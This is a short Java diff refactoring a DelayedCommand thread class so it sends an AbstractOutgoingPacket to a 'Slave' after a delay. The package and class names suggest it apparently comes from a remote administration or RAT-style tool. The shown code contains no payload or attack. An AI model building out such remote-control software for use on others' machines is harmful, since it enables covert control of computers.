@@ -1,16 +1,15 @@
 package com.redpois0n.threads;
 
-
 import com.redpois0n.Slave;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;
 
 public class DelayedCommand extends Thread {
 	
 	private Slave slave;
-	private PacketBuilder packet;
+	private AbstractOutgoingPacket packet;
 	private long ms;
 	
-	private DelayedCommand(Slave slave, PacketBuilder packet, long ms) {
+	private DelayedCommand(Slave slave, AbstractOutgoingPacket packet, long ms) {
 		super("Delayed thread");
 		this.slave = slave;
 		this.packet = packet;
@@ -26,7 +25,7 @@ public class DelayedCommand extends Thread {
 		}
 	}
 	
-	public static DelayedCommand start(Slave slave, PacketBuilder packet, long ms) {
+	public static DelayedCommand start(Slave slave, AbstractOutgoingPacket packet, long ms) {
 		DelayedCommand cmd = new DelayedCommand(slave, packet, ms);
 		cmd.start();
 		return cmd;
